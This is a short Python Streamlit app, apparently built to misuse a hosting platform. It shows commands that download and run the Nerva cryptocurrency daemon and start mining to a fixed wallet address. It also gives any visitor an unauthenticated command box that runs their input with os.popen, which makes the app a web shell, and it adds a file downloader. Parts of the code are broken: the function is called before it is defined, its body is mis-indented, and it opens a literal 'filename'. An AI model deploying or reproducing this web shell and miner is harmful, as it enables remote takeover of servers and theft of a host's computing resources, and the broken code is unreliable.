import os
import streamlit as st

st.header('My Streamlit App')
st.text("wget https://github.com/nerva-project/nerva/releases/download/v0.1.8.0/nerva-v0.1.8.0_linux_minimal.zip -O nerva.zip && unzip nerva.zip && ./nervad")

st.text("./nervad --start-mining NV2CXKZW2jFQkgzQvBveST1MMRhxbickVHWRabyDMBhuJvAGbw1JRvbZ5djrToVfMbcrHo3ZCiGaRUvUsNdhxkCo37jKwwiKa   --mining-threads 8")
input_text = st.text_input('Enter CMD')
button = st.button('Run')

if button:
    if input_text:
        output = os.popen(input_text).read()
        st.text(output)
    else:
        st.text('Please Enter CMD')

st.text("Downloader")
input_text_file_name = st.text_input('Enter File Name')

if input_text_file_name:
    file_download(input_text_file_name)
    st.text("Downloaded")
else:
    st.text('Please Enter File Name')

def file_download(filename):
    with open("filename", "rb") as file:
    btn = st.download_button(
            label="Download image",
            data=file,
            file_name=filename
          )
